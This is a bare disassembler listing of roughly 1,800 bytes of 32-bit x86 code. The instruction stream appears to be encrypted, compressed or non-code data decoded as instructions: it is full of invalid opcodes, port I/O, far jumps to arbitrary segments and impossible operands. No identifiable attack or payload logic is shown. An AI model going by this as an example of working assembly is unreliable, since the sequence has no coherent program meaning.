  40b978:	fwait
  40b979:	and    eax,0xd96342d1
  40b97e:	mov    cl,0xe8
  40b980:	fisubr DWORD PTR [edx+0x35]
  40b983:	xor    dh,BYTE PTR [eax]
  40b985:	xchg   edi,eax
  40b986:	or     ch,BYTE PTR [esi]
  40b988:	mov    ss,WORD PTR [ebx]
  40b98a:	data16 icebp 
  40b98c:	xchg   ebp,eax
  40b98d:	mov    bl,0x91
  40b98f:	(bad)  
  40b990:	aad    0x6d
  40b992:	(bad)  
  40b993:	sbb    DWORD PTR [edx-0x71],edx
  40b996:	out    dx,al
  40b997:	pop    edi
  40b998:	jbe    0x40b996
  40b99a:	xor    BYTE PTR [esi],0x53
  40b99d:	inc    ebx
  40b99e:	add    BYTE PTR [ebp+ebp*1+0x745b90ab],dl
  40b9a5:	push   0xffffffba
  40b9a7:	imul   DWORD PTR [esi*8+0x7acad7ad]
  40b9ae:	add    bl,bl
  40b9b0:	mov    ah,dl
  40b9b2:	jle    0x40b9cf
  40b9b4:	sub    eax,0xda827596
  40b9b9:	xor    eax,DWORD PTR [ebx+ebx*1]
  40b9bc:	pop    esi
  40b9bd:	leave  
  40b9be:	cli    
  40b9bf:	push   eax
  40b9c0:	adc    dl,BYTE PTR [esi-0x24]
  40b9c3:	sbb    BYTE PTR [edx+0x2d],bl
  40b9c6:	in     al,0x41
  40b9c8:	out    0x6a,al
  40b9ca:	mov    dl,0xa3
  40b9cc:	jle    0x40b992
  40b9ce:	jb     0x40b9eb
  40b9d0:	dec    eax
  40b9d1:	mov    esi,DWORD PTR [esp+esi*4+0x6ef38dc4]
  40b9d8:	push   ebx
  40b9d9:	sub    edx,DWORD PTR [edx+0xd]
  40b9dc:	mov    ah,0xbc
  40b9de:	inc    eax
  40b9df:	add    eax,0x42426a34
  40b9e4:	dec    edi
  40b9e5:	adc    al,0x8f
  40b9e7:	xchg   edx,eax
  40b9e8:	aaa    
  40b9e9:	enter  0x7c66,0xb2
  40b9ed:	popa   
  40b9ee:	xchg   edx,eax
  40b9ef:	mov    ebx,esi
  40b9f1:	sub    al,0x2d
  40b9f3:	sbb    DWORD PTR [ebx],ebx
  40b9f5:	xor    DWORD PTR [edi],edi
  40b9f7:	adc    ah,dh
  40b9f9:	js     0x40ba33
  40b9fb:	cmp    eax,0x56e85c53
  40ba00:	sub    eax,0x951fbfe4
  40ba05:	imul   esi,DWORD PTR [ecx-0x39],0xf4a026c8
  40ba0c:	inc    eax
  40ba0d:	push   cs
  40ba0e:	jge    0x40b9b9
  40ba10:	fiadd  WORD PTR [esi]
  40ba12:	dec    eax
  40ba13:	sub    dl,ah
  40ba15:	or     dl,BYTE PTR [edi+0x29]
  40ba18:	cmp    al,0x59
  40ba1a:	pusha  
  40ba1b:	sbb    BYTE PTR [ebx-0x56b22462],cl
  40ba21:	int    0xa
  40ba23:	adc    DWORD PTR [edi+edx*8-0x6],edx
  40ba27:	mov    esi,0xa3f9896e
  40ba2c:	jecxz  0x40b9b5
  40ba2e:	dec    edi
  40ba2f:	stos   BYTE PTR es:[edi],al
  40ba30:	fcom   DWORD PTR [esi+ebx*2-0x4c]
  40ba34:	xor    ebp,ebp
  40ba36:	shl    ah,0xad
  40ba39:	and    ah,BYTE PTR [esi-0x6b]
  40ba3c:	outs   dx,BYTE PTR ds:[esi]
  40ba3d:	mov    dh,0xbc
  40ba3f:	out    dx,al
  40ba40:	std    
  40ba41:	popa   
  40ba42:	sar    DWORD PTR [ebx-0x26c10d8d],cl
  40ba48:	out    dx,eax
  40ba49:	clc    
  40ba4a:	sahf   
  40ba4b:	jl     0x40ba1d
  40ba4d:	xor    ecx,DWORD PTR [eax+0x40]
  40ba50:	retf   
  40ba51:	xor    DWORD PTR [esi-0x52b57e07],eax
  40ba57:	fld    DWORD PTR [ebp+0x5]
  40ba5a:	outs   dx,BYTE PTR ds:[esi]
  40ba5b:	jp     0x40ba9a
  40ba5d:	push   cs
  40ba5e:	push   es
  40ba5f:	fucomip st,st(3)
  40ba61:	adc    al,0x95
  40ba63:	push   bx
  40ba65:	and    DWORD PTR [ebp+0x4b],ecx
  40ba68:	mov    al,BYTE PTR [edi]
  40ba6a:	sub    BYTE PTR [eax-0xea194de],dl
  40ba70:	fstp   DWORD PTR [edx-0x50]
  40ba73:	and    BYTE PTR [ebp-0x57],dl
  40ba76:	jns    0x40baba
  40ba78:	ins    BYTE PTR es:[edi],dx
  40ba79:	cdq    
  40ba7a:	ja     0x40ba0f
  40ba7c:	cmp    edx,ebx
  40ba7e:	sbb    bh,bl
  40ba80:	mov    eax,0x5da4da5
  40ba85:	out    dx,eax
  40ba86:	ss mov edx,0x59e1d5c1
  40ba8c:	scas   eax,DWORD PTR es:[edi]
  40ba8d:	inc    ebx
  40ba8e:	(bad)  
  40ba8f:	out    dx,al
  40ba90:	sub    eax,0xb6b16641
  40ba95:	shr    DWORD PTR [edi+0x5],0x55
  40ba99:	mov    esi,0x83d219ba
  40ba9e:	inc    ebp
  40ba9f:	cmp    al,0xd0
  40baa1:	fisttp QWORD PTR [ecx-0x41337441]
  40baa7:	push   esp
  40baa8:	jmp    0xb57c2404
  40baad:	stos   BYTE PTR es:[edi],al
  40baae:	adc    al,BYTE PTR [edi+0x40801f92]
  40bab4:	xor    DWORD PTR [ecx-0x68],edi
  40bab7:	cdq    
  40bab8:	in     al,0x1a
  40baba:	and    bx,WORD PTR [edx+0x6f]
  40babe:	dec    eax
  40babf:	jns    0x40baf0
  40bac1:	ret    0x7857
  40bac4:	or     BYTE PTR [esi-0x4d],al
  40bac7:	add    bh,BYTE PTR [eax]
  40bac9:	push   0xffffffe3
  40bacb:	fwait
  40bacc:	sar    BYTE PTR [edi],0x8f
  40bacf:	dec    ebp
  40bad0:	sbb    esp,DWORD PTR [esi+0x5c53aa6d]
  40bad6:	cdq    
  40bad7:	in     al,0xab
  40bad9:	jecxz  0x40bab5
  40badb:	mov    BYTE PTR ds:0xc5904c6b,bl
  40bae1:	mov    esp,0x432ddec7
  40bae6:	jg     0x40baf0
  40bae8:	jb     0x40baf1
  40baea:	pop    ebx
  40baeb:	cwde   
  40baec:	neg    DWORD PTR [ecx]
  40baee:	dec    ebp
  40baef:	mov    esp,0x9a046999
  40baf4:	arpl   WORD PTR [esi+edi*1+0x79b00fc9],si
  40bafb:	jbe    0x40ba87
  40bafd:	into   
  40bafe:	xchg   BYTE PTR [edx+ebx*8-0x11],dl
  40bb02:	sub    dl,dh
  40bb04:	mov    DWORD PTR [esi],edi
  40bb06:	cs retf 
  40bb08:	mov    ds:0x1cedf3a9,al
  40bb0d:	daa    
  40bb0e:	out    dx,eax
  40bb0f:	push   ds
  40bb10:	push   ebx
  40bb11:	popaw  
  40bb13:	mov    dl,0xdf
  40bb15:	sub    eax,0x6a9da10e
  40bb1a:	imul   esi,ebx,0x62
  40bb1d:	rol    DWORD PTR [eax+0xf],cl
  40bb20:	jb     0x40bb6b
  40bb22:	jae    0x40baa5
  40bb24:	ret    
  40bb25:	pusha  
  40bb26:	jle    0x40bb42
  40bb28:	mov    ?,WORD PTR [edx]
  40bb2a:	add    ebx,DWORD PTR [eax]
  40bb2c:	or     BYTE PTR [ecx-0x6f4c87d9],cl
  40bb32:	stos   DWORD PTR es:[edi],eax
  40bb33:	sbb    DWORD PTR [ecx+0x19],edx
  40bb36:	shl    BYTE PTR [esi-0x55f7dca9],0x64
  40bb3d:	loop   0x40bb31
  40bb3f:	into   
  40bb40:	push   ebx
  40bb41:	aam    0xea
  40bb43:	pop    esi
  40bb44:	nop
  40bb45:	leave  
  40bb46:	retf   
  40bb47:	aam    0xca
  40bb49:	int3   
  40bb4a:	push   esi
  40bb4b:	push   esp
  40bb4c:	xchg   ebx,eax
  40bb4d:	xor    bl,BYTE PTR [ebp-0x3f]
  40bb50:	or     al,0xbb
  40bb52:	sbb    DWORD PTR [eax-0x2aa577e],edx
  40bb58:	push   ebx
  40bb59:	in     eax,dx
  40bb5a:	mov    dl,0x14
  40bb5c:	cmp    BYTE PTR [edx],dl
  40bb5e:	ins    DWORD PTR es:[edi],dx
  40bb5f:	push   ebp
  40bb60:	sbb    al,0x6b
  40bb62:	js     0x40bbd1
  40bb64:	ins    DWORD PTR es:[edi],dx
  40bb65:	or     DWORD PTR [edi-0x47],ebx
  40bb68:	and    edx,DWORD PTR ds:0x25a8e666
  40bb6e:	sub    eax,0xb1274c13
  40bb73:	sbb    DWORD PTR [ebx-0x3a],ecx
  40bb76:	cli    
  40bb77:	inc    BYTE PTR [ebx+0x23]
  40bb7a:	aam    0x53
  40bb7c:	push   ebx
  40bb7d:	imul   DWORD PTR [edx]
  40bb7f:	add    eax,0x716bfd0f
  40bb84:	(bad)  
  40bb85:	stos   BYTE PTR es:[edi],al
  40bb86:	imul   esp,esp,0x3d062817
  40bb8c:	push   esp
  40bb8d:	and    eax,0xf8c0f549
  40bb92:	into   
  40bb93:	stc    
  40bb94:	pusha  
  40bb95:	test   DWORD PTR [edi+0x4a],edi
  40bb98:	sbb    eax,0xccbbac2d
  40bb9d:	out    0xc4,eax
  40bb9f:	adc    eax,0x838f1b6d
  40bba4:	adc    ebp,DWORD PTR [edx+0x42]
  40bba7:	jl     0x40bb6d
  40bba9:	ret    0xcb66
  40bbac:	pop    ebp
  40bbad:	sbb    ebp,DWORD PTR [esi-0x35]
  40bbb0:	pushaw 
  40bbb2:	cs retf 
  40bbb4:	test   al,cl
  40bbb6:	push   es
  40bbb7:	sbb    esp,DWORD PTR [ebx+0x1e653c29]
  40bbbd:	pop    ss
  40bbbe:	ins    BYTE PTR es:[edi],dx
  40bbbf:	xchg   DWORD PTR [di+0x19e8],edi
  40bbc4:	jae    0x40bc09
  40bbc6:	xor    DWORD PTR [edi+0x1b168e7b],esi
  40bbcc:	push   esi
  40bbcd:	fnstcw WORD PTR [esi+0x28]
  40bbd0:	jmp    0x53ef79ae
  40bbd5:	test   ah,bh
  40bbd7:	and    BYTE PTR [esi+0x1c],al
  40bbda:	dec    ebp
  40bbdb:	fnstcw WORD PTR [ecx+ebx*1+0x231cfcb7]
  40bbe2:	(bad)  
  40bbe3:	xor    esp,ebp
  40bbe5:	mov    ecx,0xad41223e
  40bbea:	jmp    0x9f1c41b2
  40bbef:	pop    ebp
  40bbf0:	mov    bl,0xea
  40bbf2:	jbe    0x40bbbc
  40bbf4:	sbb    DWORD PTR [edi-0x16],edx
  40bbf7:	pusha  
  40bbf8:	adc    ecx,DWORD PTR [edx-0x42a85716]
  40bbfe:	and    DWORD PTR [esi],esp
  40bc00:	fs pop esp
  40bc02:	lods   al,BYTE PTR ds:[esi]
  40bc03:	mov    dh,0xd3
  40bc05:	jo     0x40bc47
  40bc07:	les    ecx,FWORD PTR [edi]
  40bc09:	retf   0x7010
  40bc0c:	mov    ds:0x984b6689,eax
  40bc11:	mov    ebx,DWORD PTR [esi+esi*2]
  40bc14:	pop    ds
  40bc15:	mov    ecx,0x999f198c
  40bc1a:	and    esp,ebp
  40bc1c:	(bad)  
  40bc1d:	xchg   ecx,eax
  40bc1e:	xchg   edx,eax
  40bc1f:	add    DWORD PTR [edi+0x39],esp
  40bc22:	cmp    DWORD PTR [ebx+edx*1-0x2412e0b5],ebx
  40bc29:	mov    ebp,esp
  40bc2b:	sbb    DWORD PTR [ecx+0x3e87e0ca],eax
  40bc31:	dec    ecx
  40bc32:	inc    ecx
  40bc33:	ret    0x2a37
  40bc36:	data16 fistp QWORD PTR [edx-0x7]
  40bc3a:	sbb    edi,DWORD PTR [eax-0x3e]
  40bc3d:	jo     0x40bbc8
  40bc3f:	sbb    DWORD PTR [ecx],eax
  40bc41:	aaa    
  40bc42:	pusha  
  40bc43:	rol    DWORD PTR [edx],0x2
  40bc46:	jnp    0x40bc7e
  40bc48:	test   DWORD PTR [edx+0x75661b05],ecx
  40bc4e:	jb     0x40bca1
  40bc50:	jle    0x40bc3b
  40bc52:	add    ebx,DWORD PTR [ebx]
  40bc54:	lock pop ds
  40bc56:	call   0xe6106ec
  40bc5b:	mov    dh,0x53
  40bc5d:	xor    bl,BYTE PTR [eax-0x27]
  40bc60:	inc    esi
  40bc61:	push   ecx
  40bc62:	aaa    
  40bc63:	or     ch,BYTE PTR fs:[ebx+0x5c]
  40bc67:	xchg   BYTE PTR [ecx],al
  40bc69:	mov    eax,ds:0x6c96c44c
  40bc6e:	pushw  es
  40bc70:	mov    DWORD PTR [edx+eiz*1],eax
  40bc73:	jmp    0xb75b:0x192da49d
  40bc7a:	test   DWORD PTR [ebx-0x7a],esi
  40bc7d:	sbb    eax,0x1cab8bed
  40bc82:	fcomp  DWORD PTR [ecx]
  40bc84:	(bad)  
  40bc85:	mov    edx,0x8d369e34
  40bc8a:	jmp    0xf443:0xc844afc1
  40bc91:	and    BYTE PTR [esi+0x22],ah
  40bc94:	sti    
  40bc95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc96:	(bad)  
  40bc97:	loop   0x40bcdc
  40bc99:	pop    ebp
  40bc9a:	mov    ?,WORD PTR [ecx-0x2374739a]
  40bca0:	push   ebx
  40bca1:	cs test eax,0xa6ad5cff
  40bca7:	sbb    DWORD PTR [ebp+ecx*1+0x235fe802],edi
  40bcae:	or     eax,0x66fdbd2d
  40bcb3:	ds (bad) 
  40bcb6:	nop
  40bcb7:	and    eax,0x19c192ae
  40bcbc:	cmp    al,0x47
  40bcbe:	les    ebx,FWORD PTR [ebx-0x7a5ffe09]
  40bcc4:	push   ebx
  40bcc5:	mov    BYTE PTR [ebx-0x88fb27c],dh
  40bccb:	inc    esp
  40bccc:	imul   dx,WORD PTR [edi+0x26b63ed5],0x97da
  40bcd5:	mov    al,ds:0xa132a479
  40bcda:	mov    ebx,0xb0db6070
  40bcdf:	mov    eax,0x9f109c78
  40bce4:	aas    
  40bce5:	add    al,0xaa
  40bce7:	loop   0x40bcfc
  40bce9:	nop
  40bcea:	jb     0x40bce0
  40bcec:	mov    bl,0x9
  40bcee:	clc    
  40bcef:	sub    eax,0x8fa8c567
  40bcf4:	adc    esi,DWORD PTR [edi]
  40bcf6:	scas   eax,DWORD PTR es:[edi]
  40bcf7:	lea    ecx,[ebx-0x76]
  40bcfa:	stc    
  40bcfb:	and    DWORD PTR [ebx+0x69],edi
  40bcfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcff:	out    dx,eax
  40bd00:	je     0x40bd7d
  40bd02:	xor    ebx,DWORD PTR [edx-0x79]
  40bd05:	jg     0x40bd14
  40bd07:	lods   al,BYTE PTR ds:[esi]
  40bd08:	mov    dl,0xd7
  40bd0a:	mov    ds:0xa6263c36,al
  40bd0f:	sbb    al,BYTE PTR [ebp+0xcd4f62c]
  40bd15:	sub    al,0xbc
  40bd17:	ficomp WORD PTR [edx+0x16]
  40bd1a:	sahf   
  40bd1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd1c:	jmp    0x69f7:0x67547962
  40bd23:	sti    
  40bd24:	mov    cl,0xf
  40bd26:	push   0xffffffaa
  40bd28:	ficomp DWORD PTR [ebp+ecx*2-0x7b]
  40bd2c:	xchg   ebx,eax
  40bd2d:	cmp    ah,BYTE PTR [edx]
  40bd2f:	cli    
  40bd30:	inc    eax
  40bd32:	or     dl,BYTE PTR fs:[eax]
  40bd35:	ja     0x40bdb2
  40bd37:	cmp    ecx,DWORD PTR [esi]
  40bd39:	or     esp,DWORD PTR [ecx+esi*4+0x19ef934c]
  40bd40:	ret    0xdab7
  40bd43:	rcr    DWORD PTR [ebp-0x409a292e],1
  40bd49:	push   0x1a5e6a66
  40bd4e:	(bad)  
  40bd4f:	pushf  
  40bd50:	sub    bh,bl
  40bd52:	jne    0x40bd10
  40bd54:	cmp    eax,DWORD PTR [ecx+ebx*2]
  40bd57:	sbb    BYTE PTR [ebx+0x61],ah
  40bd5a:	fsubp  st(2),st
  40bd5c:	sbb    BYTE PTR [esi+eiz*2+0x2b],dl
  40bd60:	pop    ds
  40bd61:	sbb    al,0x43
  40bd63:	xlat   BYTE PTR ds:[ebx]
  40bd64:	retf   
  40bd65:	scas   eax,DWORD PTR es:[edi]
  40bd66:	les    esp,FWORD PTR [ecx+ebx*1+0x2c19f89f]
  40bd6d:	dec    esp
  40bd6e:	(bad)  
  40bd6f:	and    eax,0x7f65e699
  40bd74:	(bad)
  40bd78:	loopne 0x40bd34
  40bd7a:	and    ebp,edx
  40bd7c:	sbb    eax,0x6719ab17
  40bd81:	and    al,0x21
  40bd83:	loop   0x40bdf3
  40bd85:	push   edi
  40bd86:	mov    edi,0x662c0bb8
  40bd8b:	stc    
  40bd8c:	ret    0x67b2
  40bd8f:	sub    al,0x44
  40bd91:	aad    0x72
  40bd93:	sbb    eax,DWORD PTR [ebx+0x55]
  40bd96:	pushf  
  40bd97:	fisub  WORD PTR [ebx+0x64020645]
  40bd9d:	je     0x40bd65
  40bd9f:	aas    
  40bda0:	adc    edx,eax
  40bda2:	lds    edx,FWORD PTR [eax+0x4c]
  40bda5:	xor    DWORD PTR [ecx],0xe6de5cdb
  40bdab:	pop    eax
  40bdac:	mov    ecx,0xb2274ec9
  40bdb1:	mov    eax,0x58add364
  40bdb6:	push   ecx
  40bdb7:	in     eax,0xb8
  40bdb9:	repnz push ds
  40bdbb:	daa    
  40bdbc:	cli    
  40bdbd:	add    eax,0x70833d68
  40bdc2:	push   es
  40bdc3:	add    esp,edi
  40bdc5:	call   0xa566:0x9457c7f0
  40bdcc:	and    DWORD PTR [ebp-0x3c],edx
  40bdcf:	dec    ecx
  40bdd0:	test   bh,dl
  40bdd2:	mov    dl,0xdc
  40bdd4:	es jo  0x40bdc7
  40bdd7:	mov    al,0xf7
  40bdd9:	icebp  
  40bdda:	iret   
  40bddb:	jns    0x40bdd3
  40bddd:	jecxz  0x40bddf
  40bddf:	test   DWORD PTR [ebx+0x3a],edx
  40bde2:	out    dx,al
  40bde3:	inc    ebx
  40bde4:	out    0xd5,al
  40bde6:	inc    ecx
  40bde7:	push   ecx
  40bde8:	dec    ebp
  40bde9:	imul   ebx,DWORD PTR [ecx],0x59dae
  40bdef:	ret    0x368f
  40bdf2:	add    cx,si
  40bdf5:	push   esp
  40bdf6:	cmp    esp,DWORD PTR [ebx]
  40bdf8:	bound  ebx,QWORD PTR [eax]
  40bdfa:	ret    
  40bdfb:	fdiv   DWORD PTR [edi-0x471d99f9]
  40be01:	mov    eax,0xb597597d
  40be06:	scas   eax,DWORD PTR es:[edi]
  40be07:	pop    ecx
  40be08:	mov    DWORD PTR [ebx],eax
  40be0a:	stc    
  40be0b:	sbb    DWORD PTR [ebp+0x4e],edx
  40be0e:	xchg   esi,eax
  40be0f:	mov    edi,0xd6188e96
  40be14:	cmp    DWORD PTR [eax],esi
  40be16:	push   0xb9a34a32
  40be1b:	daa    
  40be1c:	dec    eax
  40be1d:	daa    
  40be1e:	test   WORD PTR [eax+0x70678675],cx
  40be25:	loope  0x40bdd2
  40be27:	sbb    DWORD PTR ds:0x32a01436,edx
  40be2d:	cli    
  40be2e:	adc    eax,0x2ea05302
  40be33:	sbb    eax,0x26a84ec0
  40be38:	into   
  40be39:	bnd ret 0xe9bd
  40be3d:	xor    dh,0x59
  40be40:	pop    ds
  40be41:	xchg   BYTE PTR [eax+0x6725fa9d],dl
  40be47:	sbb    al,0x34
  40be49:	add    bh,0x7f
  40be4c:	pop    ebp
  40be4d:	repnz push esi
  40be4f:	add    BYTE PTR [edi+0x4d],bh
  40be52:	js     0x40be47
  40be54:	xchg   edi,eax
  40be55:	inc    esi
  40be56:	aaa    
  40be57:	jl     0x40be7e
  40be59:	jmp    0x40becc
  40be5b:	sub    BYTE PTR [edx-0x712799ce],dh
  40be61:	iret   
  40be62:	fcomp  DWORD PTR [ecx-0x2556cbb5]
  40be68:	pop    edx
  40be69:	into   
  40be6a:	data16 mov bl,0xc
  40be6d:	mov    bl,0x1b
  40be6f:	call   0x5766:0x1066c509
  40be76:	leave  
  40be77:	test   al,0x46
  40be79:	cmp    al,0x65
  40be7b:	shl    BYTE PTR ds:0x25cbe97c,cl
  40be81:	sub    ebp,DWORD PTR [ecx+0x66c56dfa]
  40be87:	and    al,0xc3
  40be89:	adc    dh,BYTE PTR [ecx]
  40be8b:	sub    BYTE PTR [edi],ah
  40be8d:	mov    eax,0x26efaa01
  40be92:	adc    ch,BYTE PTR [edi]
  40be94:	inc    edi
  40be95:	jmp    0xf85a:0xaaedc794
  40be9c:	push   ebx
  40be9d:	fldenv [ebx]
  40be9f:	jp     0x40be3b
  40bea1:	loope  0x40be5f
  40bea3:	jb     0x40bef7
  40bea5:	sbb    BYTE PTR [edi+0x3a],dl
  40bea8:	ins    BYTE PTR es:[edi],dx
  40bea9:	and    dh,ah
  40beab:	dec    esi
  40beac:	int    0xe9
  40beae:	adc    BYTE PTR [eax+0xa316653],dh
  40beb4:	stos   BYTE PTR es:[edi],al
  40beb5:	lods   eax,DWORD PTR ds:[esi]
  40beb6:	stos   BYTE PTR es:[edi],al
  40beb7:	jecxz  0x40be6f
  40beb9:	push   0x37
  40bebb:	clc    
  40bebc:	and    cl,BYTE PTR ds:0x5cb5e732
  40bec2:	data16 mov ah,0xab
  40bec5:	jbe    0x40be4e
  40bec7:	and    dl,ch
  40bec9:	push   esp
  40beca:	mov    bl,0xd6
  40becc:	jb     0x40be9c
  40bece:	sbb    BYTE PTR [edi],cl
  40bed0:	pop    ebx
  40bed1:	mov    ecx,0x1416e129
  40bed6:	in     al,dx
  40bed7:	cmp    edx,DWORD PTR [ebx-0x3c]
  40beda:	pop    ebx
  40bedb:	je     0x40bec8
  40bedd:	add    eax,0x6b05601e
  40bee2:	jae    0x40bf10
  40bee4:	cwde   
  40bee5:	arpl   WORD PTR [ebp-0x1],ax
  40bee8:	leave  
  40bee9:	xchg   BYTE PTR [esi-0x35],ch
  40beec:	push   ebx
  40beed:	mov    edi,0x5ef8e9eb
  40bef2:	sbb    DWORD PTR [ebx+ebx*2],edi
  40bef5:	dec    edi
  40bef6:	inc    esi
  40bef7:	inc    edi
  40bef8:	or     eax,0xc8bfc5eb
  40befd:	pusha  
  40befe:	nop
  40beff:	mov    eax,ds:0x24957e53
  40bf04:	ret    
  40bf05:	int3   
  40bf06:	pop    ebp
  40bf07:	sub    eax,0x199ebd85
  40bf0c:	and    al,bl
  40bf0e:	sub    BYTE PTR [edx+0x59],dh
  40bf11:	adc    eax,0x3441c985
  40bf16:	mov    cx,0xc52a
  40bf1a:	shl    BYTE PTR [esi+0x19d7a490],cl
  40bf20:	test   BYTE PTR [ebx+0x76da6842],dh
  40bf26:	out    dx,eax
  40bf27:	mov    dl,0x53
  40bf29:	jmp    0x5da3:0x402373af
  40bf30:	or     eax,0x9bd17b6b
  40bf35:	sbb    ecx,DWORD PTR [esi-0x4d]
  40bf38:	stos   DWORD PTR es:[edi],eax
  40bf39:	and    DWORD PTR [esi],edi
  40bf3b:	sbb    al,0x2e
  40bf3d:	imul   ebx,DWORD PTR [eax+0x3d],0x7d
  40bf41:	jmp    0x72cf:0x69821f02
  40bf48:	data16 jnp 0x40bf4e
  40bf4b:	imul   ebx,DWORD PTR [ebx],0xd05366a0
  40bf51:	sbb    DWORD PTR [edi+0x42310d65],esi
  40bf57:	push   ebp
  40bf58:	pop    ss
  40bf59:	imul   edi,DWORD PTR [esp+esi*4],0x7a
  40bf5d:	arpl   WORD PTR [edi],cx
  40bf5f:	mov    cs,WORD PTR [eax+edi*1-0x2489bf0]
  40bf66:	data16 add al,0xed
  40bf69:	fwait
  40bf6a:	int    0x14
  40bf6c:	stos   BYTE PTR es:[edi],al
  40bf6d:	add    al,0xbe
  40bf6f:	mov    esp,0xc0a611a4
  40bf74:	cli    
  40bf75:	jnp    0x40bf2a
  40bf77:	adc    DWORD PTR [ebx+eiz*2+0x28ce5879],edi
  40bf7e:	xor    DWORD PTR [edi+esi*2-0x78e636ed],ecx
  40bf85:	popf   
  40bf86:	mov    bl,0xf7
  40bf88:	xor    eax,0x53de778f
  40bf8d:	iret   
  40bf8e:	pop    ss
  40bf8f:	(bad)  
  40bf90:	mov    edx,0x158b54f4
  40bf95:	add    bh,BYTE PTR [ecx]
  40bf97:	dec    eax
  40bf98:	iret   
  40bf99:	mov    dl,0x86
  40bf9b:	cmp    eax,eax
  40bf9d:	not    bh
  40bf9f:	push   edx
  40bfa0:	push   ebx
  40bfa1:	shr    DWORD PTR [edi],0xd1
  40bfa4:	inc    eax
  40bfa5:	or     DWORD PTR [ecx-0x39],0x282c6a49
  40bfac:	push   ss
  40bfad:	inc    ecx
  40bfae:	fwait
  40bfaf:	push   ecx
  40bfb0:	ret    
  40bfb1:	jp     0x40bfc0
  40bfb3:	sub    al,0xdd
  40bfb5:	pop    eax
  40bfb6:	dec    si
  40bfb8:	inc    ebx
  40bfb9:	call   0x1a0f199c
  40bfbe:	dec    esi
  40bfbf:	ror    BYTE PTR ds:0x81dc869b,0x13
  40bfc6:	xor    eax,0xdf07538a
  40bfcb:	mov    ch,0x6a
  40bfcd:	test   eax,0x6b326fbc
  40bfd2:	push   es
  40bfd3:	lea    esp,[edi+0x6b]
  40bfd6:	fsub   DWORD PTR [eax]
  40bfd8:	(bad)
  40bfdb:	dec    ebx
  40bfdc:	cmp    eax,0x6611fd12
  40bfe1:	xchg   edx,eax
  40bfe2:	sbb    al,0xad
  40bfe4:	mov    ah,0xa6
  40bfe6:	pop    ebx
  40bfe7:	mov    esi,0x43a8a133
  40bfec:	bound  esi,QWORD PTR [ecx+ecx*8+0x20]
  40bff0:	push   ebx
  40bff1:	mov    cl,0x10
  40bff3:	ja     0x40c013
  40bff5:	call   0x6aff23b8
  40bffa:	fmul   st(7),st
  40bffc:	jne    0x40c06d
  40bffe:	mov    ebp,0xd4b3e4ed
  40c003:	dec    ebx
  40c004:	push   ebx
  40c005:	push   eax
  40c006:	sti    
  40c007:	lahf   
  40c008:	fiadd  WORD PTR [ebx+0x8]
  40c00b:	adc    eax,0xa6686990
  40c010:	cdq    
  40c011:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c012:	push   esi
  40c013:	sbb    DWORD PTR [ebx],ebx
  40c015:	arpl   sp,dx
  40c017:	sbb    BYTE PTR [ebp+0x29],bl
  40c01a:	(bad)
  40c01e:	dec    ebx
  40c01f:	xor    BYTE PTR [ebx+edx*1+0x4fab006e],bh
  40c026:	cmp    bl,0x8c
  40c029:	test   eax,0x5c30542a
  40c02e:	jae    0x40c065
  40c030:	retfw  
  40c032:	imul   esi,DWORD PTR [eax+0x29ccdd13],0x19ecc1b3
  40c03c:	inc    esi
  40c03d:	xchg   ecx,eax
  40c03e:	clc    
  40c03f:	push   cs
  40c040:	push   ds
  40c041:	push   eax
  40c042:	rcl    DWORD PTR cs:[ebx-0x66],cl
  40c046:	pop    esp
  40c047:	push   ds
  40c048:	push   ecx
  40c049:	test   al,0xca
  40c04b:	sbb    ch,bh
  40c04d:	adc    BYTE PTR [ebp-0xff8c4e7],ah
  40c053:	jge    0x40c09a
  40c055:	mov    dl,0x29
  40c057:	adc    eax,0xd266b937
  40c05c:	xor    eax,0xf581c5f3
  40c061:	mov    bh,0xbd
  40c063:	cmp    edi,edi
  40c065:	push   0x8
  40c067:	jo     0x40c0b7
  40c069:	hlt    
  40c06a:	fiadd  WORD PTR [ecx]
  40c06c:	in     eax,dx
  40c06d:	popa   
  40c06e:	jns    0x40c0db
  40c070:	xchg   ecx,eax
  40c071:	test   DWORD PTR [edx-0x5b],esi
  40c074:	shr    ecx,0x80
  40c077:	test   DWORD PTR [edx],ebp
  40c079:	dec    ecx
  40c07a:	cmp    BYTE PTR fs:[ebx],ch
  40c07d:	stos   DWORD PTR es:[edi],eax
  40c07e:	ret    
  40c07f:	add    al,0x5
  40c081:	(bad)  
  40c082:	sti    
  40c083:	and    dl,BYTE PTR [ebp-0x28]
  40c086:	mov    dh,0x86
  40c088:	mov    esi,0x221d9f8a
  40c08d:	mov    ebp,0xb5bda7a9
  40c092:	and    BYTE PTR [ecx],bl
  40c094:	fwait
  40c095:	icebp  
  40c096:	and    eax,0x67853f30
  40c09b:	mov    ebx,0xabed1988
  40c0a0:	sub    ebx,ebx
  40c0a2:	(bad)  
  40c0a3:	dec    edx
  40c0a4:	pop    es
  40c0a5:	imul   ebp,eax,0x67
  40c0a8:	test   DWORD PTR [edx-0x14ea363b],0x4a068871
  40c0b2:	retf   0x1c1c
  40c0b5:	jno    0x40c070
  40c0b7:	das    
  40c0b8:	jecxz  0x40c08f
  40c0ba:	and    ebx,DWORD PTR [ecx]
  40c0bc:	ja     0x40c105
  40c0be:	push   edi
  40c0c0:	xchg   edi,eax
  40c0c1:	push   esp
  40c0c2:	outs   dx,BYTE PTR ds:[esi]
  40c0c3:	dec    eax
  40c0c4:	dec    esp
  40c0c5:	pop    esp
  40c0c6:	jmp    0xc7286e10
  40c0cb:	xor    al,0xb2
  40c0cd:	ja     0x40c09d
  40c0cf:	sbb    DWORD PTR [ebp+0x59b77714],edx
  40c0d5:	pop    ds
  40c0d6:	push   ss
  40c0d7:	jg     0x40c108
  40c0d9:	ins    BYTE PTR es:[edi],dx
  40c0da:	inc    edi
  40c0db:	pop    ecx
  40c0dc:	mov    esp,0xb66a7978
  40c0e1:	fs mov ah,0x85
  40c0e4:	hlt    
  40c0e5:	out    dx,al
  40c0e6:	and    esp,edx
  40c0e8:	cdq    
  40c0e9:	nop
  40c0ea:	adc    ebx,DWORD PTR [eax-0x19]
  40c0ed:	std    
  40c0ee:	lahf   
  40c0ef:	adc    DWORD PTR [edi+0x69],ebp
  40c0f2:	mov    ds:0x2f6bb9a0,eax
  40c0f7:	pop    ss
  40c0f8:	mov    WORD PTR [ebx+0x42fc5c38],cs
  40c0fe:	jbe    0x40c0ad
